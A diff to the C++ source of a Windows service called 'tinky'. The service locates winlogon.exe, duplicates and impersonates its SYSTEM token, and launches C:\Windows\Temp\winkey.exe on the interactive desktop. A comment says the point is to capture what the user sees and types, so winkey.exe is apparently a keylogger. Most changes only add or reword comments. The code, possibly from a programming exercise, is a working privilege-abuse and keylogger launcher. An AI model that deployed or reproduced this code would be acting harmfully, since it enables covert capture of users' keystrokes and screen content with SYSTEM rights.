@@ -1,13 +1,16 @@
 #ifndef _WIN32_WINNT
-#define _WIN32_WINNT 0x0A00 // Windows 10 minimum
+#define _WIN32_WINNT 0x0A00
 #endif
+
+// Macro to specify the operating system (OS) version of the
+// content within the Windows Driver Kit (WDK) header files and libraries
 #define NTDDI_VERSION 0x0A000000
 
-#define WIN32_LEAN_AND_MEAN // reduce size of the windows headers
+#define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
 #define _UNICODE
 #define UNICODE
-#pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Advapi32.lib") // Specifies during compilation to add this lib during linking
 #include <windows.h>
 #include <cwchar>
 #include <cstdio>
@@ -19,9 +22,9 @@
 
 #define SVCNAME L"tinky"
 
-// info about WINAPI in functions signatures :
+// Info about WINAPI in functions signatures :
 // #define WINAPI __stdcall
-// it is SCM that calls our code, and Windows expects __stdcall signature
+// -> it is SCM that calls our code, and Windows expects __stdcall signature
 
 SERVICE_STATUS gSvcStatus{};
 SERVICE_STATUS_HANDLE gSvcStatusHandle = nullptr;
@@ -31,17 +34,18 @@ HANDLE hwinkey = nullptr;
 VOID WINAPI SvcCtrlHandler(DWORD);
 VOID ReportSvcStatus(DWORD, DWORD, DWORD);
 VOID SvcInit(DWORD, LPWSTR *);
-void SvcReportEvent(const wchar_t *);
 void LogEvent(const std::wstring &message);
 
-// TOKEN IMPERSONATION*************************
+//
+// Purpose:
+//      Get the PID of winlogon to retrieve its token
 
 HANDLE GetSystemTokenFromWinlogon()
 {
-    // Our aim is to get the PID of winlogon to retrieve its token
     DWORD pid = 0;
 
     // 1. Find winlogon.exe
+
     // Takes a snapshot of the system current processes
     // the option TH32CS_SNAPPROCESS tells to take all the processes
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -50,7 +54,7 @@ HANDLE GetSystemTokenFromWinlogon()
     // we have to precise the size according to windows
     PROCESSENTRY32 pe{sizeof(pe)};
 
-    // to parse the snapshot by each process
+    // To parse the snapshot by each process
     // Proces32First is called once, Process32Next is called for remaining iterations
     for (Process32First(snap, &pe); Process32Next(snap, &pe);)
     {
@@ -63,7 +67,6 @@ HANDLE GetSystemTokenFromWinlogon()
     }
     CloseHandle(snap);
 
-    // if winlogon not found
     if (!pid)
         return NULL;
 
@@ -98,11 +101,6 @@ bool ImpersonateSystem(HANDLE hDupToken)
     }
 
     return true;
-}
-
-void SvcReportEvent(const wchar_t *msg)
-{
-    wprintf(L"%s\n", msg);
 }
 
 void LogEvent(const std::wstring &message)
@@ -189,36 +187,40 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
 
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
+    // Interactive window station, so we can retrieve what the user sees and types
     si.lpDesktop = L"WinSta0\\Default";
 
     PROCESS_INFORMATION pi;
 
-    // path is in temp because we can't get the working directory of the project
+    // Path is in temp because we can't get the working directory of the project
     // here our current directory is C:\\system32
     BOOL bResult = CreateProcessAsUserW(
-        hTokenDup,
-        L"C:\\Windows\\Temp\\winkey.exe",
-        nullptr,
-        nullptr,
-        nullptr,
-        FALSE,
-        DETACHED_PROCESS,
-        nullptr,
-        nullptr,
-        &si,
-        &pi);
+        hTokenDup,                        // Handle of the token
+        L"C:\\Windows\\Temp\\winkey.exe", // lpApplicationName
+        nullptr,                          // lpCommandLine
+        nullptr,                          // lpProcessAttributes
+        nullptr,                          // lpThreadAttributes
+        FALSE,                            // bInheritHandles
+        DETACHED_PROCESS,                 // dwCreationFlags
+        nullptr,                          // lpEnvironment
+        nullptr,                          // lpCurrentDirectory : null for parent's dir
+        &si,                              // lpStartupInfo
+        &pi);                             // lpProcessInformation
 
     RevertToSelf();
     CloseHandle(hTokenDup);
     if (bResult == 0)
     {
         LogEvent(L"Failed to create, GetLastError=" + std::to_wstring(GetLastError()));
-        // TODO: return ;
+	CloseHandle(ghSvcStopEvent);
+    	ghSvcStopEvent = nullptr;
+        return;
     }
-    hwinkey = pi.hProcess;   // save the process handler to kill it when stopping
-    CloseHandle(pi.hThread); // we never have to use the thread handle
+    hwinkey = pi.hProcess;   // Save the process handle to close it when killing
+    CloseHandle(pi.hThread); // We never have to use the thread handle
 
     int counter = 0;
+    // The work loop ! Checks for stop event every 1s or runs infinitely
     while (WaitForSingleObject(ghSvcStopEvent, 1000) == WAIT_TIMEOUT)
     {
         counter++;
@@ -282,7 +284,7 @@ VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
     if (dwCtrl == SERVICE_CONTROL_STOP)
     {
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
-        // kill winkey.exe
+        // Kill winkey.exe
         if (hwinkey != nullptr)
         {
             if (TerminateProcess(hwinkey, 0) == 0)
@@ -318,7 +320,6 @@ VOID WINAPI SvcMain(DWORD dwArgc, LPWSTR *lpszArgv)
 
     if (!gSvcStatusHandle)
     {
-        SvcReportEvent(L"RegisterServiceCtrlHandler");
         return;
     }
 
